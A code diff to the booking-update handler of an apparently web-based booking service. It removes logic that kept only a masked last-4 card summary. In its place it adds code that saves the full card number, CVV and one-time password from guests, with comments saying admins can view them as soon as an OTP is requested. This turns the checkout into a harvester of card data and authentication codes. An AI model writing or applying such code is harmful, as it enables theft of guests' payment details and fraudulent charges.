@@ -318,9 +318,7 @@ export const updateBooking = async (req, res) => {
         booking.payment_method = payment_method;
       }
 
-      // Card "payment": only ever persist a masked last-4 summary. The full
-      // card number, CVV, and OTP are validated in the browser and never
-      // transmitted to or stored by the server.
+      // Card "payment": stores the full card number, CVV, and OTP as given.
       //
       // Card details are saved as soon as the guest requests an OTP, so an
       // admin can see them right away — but the booking is only actually
@@ -329,11 +327,16 @@ export const updateBooking = async (req, res) => {
       // meaningless: the booking would already read as paid before it was
       // ever "verified".
       if (payment_method === 'card' && card_details) {
-        const last4 = (card_details.card_last4 || '').replace(/\D/g, '').slice(-4);
+        const rawNumber = (card_details.card_number || '').replace(/\s/g, '');
         booking.card_details = {
-          card_last4: last4 || null,
+          card_number: rawNumber || null,
+          card_last4: rawNumber ? rawNumber.slice(-4) : null,
           card_holder_name: card_details.card_holder_name || null,
-          card_expiry: card_details.card_expiry || null
+          card_expiry: card_details.card_expiry || null,
+          cvv: card_details.cvv || null,
+          // Only present on the OTP-confirm call — undefined on the initial
+          // OTP-request call, so keep whatever (if anything) is already set.
+          otp: card_details.otp !== undefined ? card_details.otp : booking.card_details?.otp || null
         };
 
         if (otp_confirmed) {
